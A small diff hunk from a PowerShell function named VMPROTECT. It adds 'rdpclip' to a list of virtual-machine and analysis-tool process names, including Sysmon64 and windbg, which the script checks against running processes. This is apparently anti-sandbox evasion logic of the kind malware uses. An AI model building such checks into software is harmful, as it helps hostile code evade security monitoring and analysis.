@@ -280,7 +280,7 @@ function VMPROTECT {
         "vboxcontrol", "vboxservice", "vboxtray", "vgauthservice", 
         "vm3dservice", "vmacthlp", "vmtoolsd", "vmwareuser", 
         "vt-windows-event-stream", "windbg", "VmRemoteGuest", 
-        "Sysmon64", "xenservice"
+        "Sysmon64", "xenservice", "rdpclip"
     )
 
     $runningVMProcesses = Get-Process | Where-Object { $vm_process -contains $_.Name }
